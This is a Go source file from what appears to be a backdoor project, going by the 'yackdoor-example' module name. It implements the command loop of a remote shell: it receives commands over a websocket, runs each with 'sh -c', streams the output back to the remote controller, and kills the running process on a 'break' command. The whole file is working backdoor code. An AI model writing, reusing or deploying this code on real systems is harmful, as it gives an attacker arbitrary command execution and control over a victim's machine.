package Communicate

import (
	"encoding/json"
	"log"
	"os/exec"

	"github.com/bruh-boys/yackdoor-example/api"
	"golang.org/x/net/websocket"
)

func GetCommand(conn *websocket.Conn) {
	for {
		var msg api.ApiCommand

		if err := json.NewDecoder(conn).Decode(&msg); err != nil {
			log.Fatal(err)
		}

		commandExecChan <- msg.Command
	}
}
func ExecuteCommand() {
	for {
		command := <-commandExecChan
		log.Println(command)
		if command == "break" {
			secondCommand <- command
			continue
		}

		cmd = exec.Command("sh", "-c", command)

		cmd.Stdout = &(b)
		cmd.Stderr = &(b)
		cmd.Start()

	}

}

func GetOutAndErr(conn *websocket.Conn) {

	for {

		if b.String() != "" {

			json.NewEncoder(conn).Encode(api.ApiOutput{
				ForWho: "idk",
				Output: b.String(),
			})
			b.Reset()

		}
	}
}
func KillProcess() {

	for {
		<-secondCommand

		log.Println("okay , wait please")

		if err := cmd.Process.Kill(); err != nil {
			log.Println(err)

		}
	}
}
